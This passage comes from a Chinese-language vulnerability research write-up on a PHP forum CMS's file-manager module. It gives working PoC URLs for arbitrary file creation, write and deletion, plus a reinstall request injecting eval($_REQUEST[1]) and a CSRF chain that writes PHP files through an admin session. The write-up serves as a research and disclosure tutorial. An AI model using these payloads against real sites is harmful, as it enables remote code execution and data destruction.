            if (!$mkname) {
                ExitJson('请输入目录或文件的名称');
            }
            if ($type == 'mkdir') {
                if (file_exists($path . "/{$mkname}")) {
                    ExitJson('目录已存在');
                }
                $r = mkdir($path . "/{$mkname}");
            } else {
                if (file_exists($path . "/{$mkname}")) {
                    ExitJson('文件已存在');
                }
                $r = file_put_contents($path . "/{$mkname}", '');
            }
            ExitJson('操作完成', $r === FALSE ? FALSE : TRUE);
            break;
    }
3、研究路由，查看如何调用漏洞函数  
1）首先查看这个漏洞路径为/app/filesmanager/index.php  
字面上意思是在/app/目录下的一个文件管理的操作  
​
2）回到网站，刚刚黑盒测试的时候，发现路由规律为：  
请求了[http://192.168.150.9/index.php?c=read&id=1&page=1](http://192.168.150.9/index.php?c=read&id=1&page=1)后，会发出这样的一个请求：/index.php?c=app&a=puyuetianeditor:index&s=myfiles&page=1
* * *
通过a=puyuetianeditor:index，定位文件位置为/app/puyuetianeditor/index.php  
3）在文件中看到继续请求了'/app/puyuetianeditor/phpscript/' . $_G['GET']['S'] .
'.php，在URL中可以看到s传入的参数为myfiles，所以可以定位文件路径为：/app/puyuetianeditor/phpscript/myfiles.php  
4）漏洞路径/app/filesmanager/index.php即可以对应URL
    /?c=app&a=filesmanager:index
### 四、验证漏洞
### 任意创建文件
1、搭建网站并登录进网站后台  
2、漏洞存在点为/app/filesmanager/index.php  
3、进行一些操作后，通过file_put_contents创建文件  
poc:
    http://127.0.0.1/index.php?c=app&a=filesmanager:index&type=mkfile&mkname=123.php
4、在网站根目录可以看到文件创建成功  
### 任意文件写入
poc:
    http://127.0.0.1/index.php?c=app&a=filesmanager:index&type=save&path=123.php
    POST：
    filecontent=
漏洞文件存在的路径为/app/filesmanager/index.php  
可以看到文件内容成功写入  
尝试执行命令  
### 任意文件删除
poc:
    http://127.0.0.1/index.php?c=app&a=filesmanager:index&type=del&path=123.php
漏洞文件存在的路径为/app/filesmanager/index.php  
可以看到123.php文件已成功删除。  
### 五、组合漏洞扩大成果
### 1、任意文件删除配合系统重装（失败）
以前就有看到过这样的漏洞，因为系统重装的时候，会将用户输入的配置信息写入到php文件中，那么如果可以输入代码，便可以成功执行了，这里尝试一下。  
1）首先查看index.php文件  
只要install.locked文件存在即表示网站已安装  
2）再看/install/index.php，可以看到也是这个文件存在即不能重装系统。  
3）通过任意文件删除，将此文件进行删除：
    http://192.168.150.9/index.php?c=app&a=filesmanager:index&type=del&path=C://phpStudy/WWW/install/install.locked
4）访问/install/index.php即可进行重装系统操作  
5）正常执行，在step=2的时候，输入数据库等信息  
定位到/phpscript/environment.php文件  
再到/template/environment.hst  
发现关键字mysql_username  
全局搜索一下，定位文件位置：  
可以看到配置信息最后会写入到这里。  
6）抓取传入信息的数据包，进行测试  
多次fuzz，确认确实可以写入一些东西
    POST /install/index.php?step=3 HTTP/1.1
    Host: 192.168.150.9
    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:93.0) Gecko/20100101 Firefox/93.0
    Accept: application/json, text/javascript, */*; q=0.01
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Accept-Encoding: gzip, deflate
    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
    X-Requested-With: XMLHttpRequest
    Content-Length: 302
    Origin: http://192.168.150.9
    Connection: close
    Referer: http://192.168.150.9/install/index.php?step=2
    Cookie: PHPSESSID=b9imt0v97o8hsml01jr0tro9n3; UIA=KXoyLywxNlo2YDQtLl8tX2BlMjAqLzUqX103Y1xlZWBcMzFeXi4xXjQsYDBeMC8tZDEsXjIxMCoxLjIvXmQ1Y14w; app_puyuetianeditor_editcontent=%3Cbr%3E
    _webos=*&mysql_type=mysql&mysql_location=127.0.0.1&mysql_username=root&mysql_password=root&mysql_database='eval($_REQUEST[1])&mysql_prefix=pk_&mysql_charset=set+names+utf8&adminusername=phpinfo();&adminpassword=phpinfo();&adminemail=admin%40qq.com&hs_username=&hs_password=&hs_domain=192.168.150.9
7）最后发现不能传入;，否则会报错  
8）假设传入进去了，又会显示403  
9）感觉有机会，后面就看师傅们尝试了。。。  
​
### 2、任意文件写入配合CSRF（成功）
在dedecms中看到过的漏洞，因为后台的任意写文件在没有管理员权限的支持下无法利用，那么倘若配合CSRF漏洞，借用管理员的cookie便可以直接执行，扩大漏洞危害。  
在这里尝试一下：  
1）首先抓取写入文件的数据包，可以看到没有明显的token等字段  
2）在漏洞文件中只是看到了权限检测  
3）使用burp生成任意文件写入的CSRF漏洞POC，保存为test.html  
4）生成任意文件创建的CSRF漏洞POC  
5）将两个文件整合到一起，并设置自动提交
6）在已登录的浏览器中打开test.html文件  
跳转了几次后，显示ok，保存失败  
跟前面任意文件写入的返回是一样的，在网站根目录可以看到已经成功写入了  
执行命令  
## 0x04 挖掘后期&总结
挖掘后干嘛？提交漏洞呗～  
好的，这个算是刚开始学习没多久挖掘到的漏洞，其实现在觉得技术含量不高，发现漏洞也不难，主要想分享一下过程以及思路。  
最后，希望看到这篇文章到小伙伴也能很快挖掘到通用型漏洞～